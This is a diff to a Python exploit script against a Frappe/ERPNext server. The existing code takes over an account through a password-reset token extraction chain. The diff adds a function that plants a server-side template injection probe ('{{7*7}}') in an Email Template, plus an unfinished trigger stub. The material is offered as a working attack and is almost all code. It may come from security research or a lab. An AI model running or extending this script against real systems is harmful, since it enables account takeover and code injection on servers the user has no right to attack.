@@ -88,6 +88,42 @@ def reset_password(session, url, reset_token, username, password='@Donkey1234',p
     else:
         print(F"Error in reset_password: {res.status_code}, {res.content}")
         exit(1)
+'''
+def login(session, url, username, password='@Donkey1234', proxies=None):
+    data = {"cmd": "login", "usr": F"{username}", "pwd": F"{password}", "device": "desktop"}
+    res = None
+    if proxies!= None:
+        res = session.post(url, data=data, proxies=proxies)
+    else:
+        res = session.post(url, data=data)
+    if res.status_code == 200:
+        print('here',res.content)
+        res1 = session.get(url + 'desk')
+        #print(res1.content)
+
+    else:
+        print(F"Error logging in: {res.status_code}, {res.content}")
+        exit(1)
+'''
+def create_email_template(session, url, proxies=None):
+    url += 'api/method/frappe.desk.form.save.savedocs'
+    template_name = "ssti_t23"
+    ssti = "{{7*7}}"
+    data = {
+        "doc": "{\"docstatus\":0,\"doctype\":\"Email Template\",\"name\":\"New Email Template 1\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"zeljka.k@randomdomain.com\",\"__newname\":\"%s\",\"subject\":\"ssti_t6\",\"response\":\"<div>%s</div>\"}" % (template_name,ssti),
+        "action": "Save"
+        }
+    res = None
+    if proxies!= None:
+        res = session.post(url, data=data, proxies=proxies)
+    else:
+        res = session.post(url, data=data)
+    print(res.content)
+
+def trigger_ssti_email_template(session, url, proxies=None):
+    url += 'api/method/frappe.email.doctype.email_template.email_template.get_email_template'
+    pass
+
 if __name__ == '__main__':
     url = "http://erpnext:8000/"
     session = requests.session()
@@ -101,3 +137,5 @@ if __name__ == '__main__':
     request_password_reset(session, url, user)
     reset_token = extract_password_reset_token(session, url, user)
     reset_password(session, url, reset_token, user)
+    #login(session, url, user)
+    create_email_template(session, url)
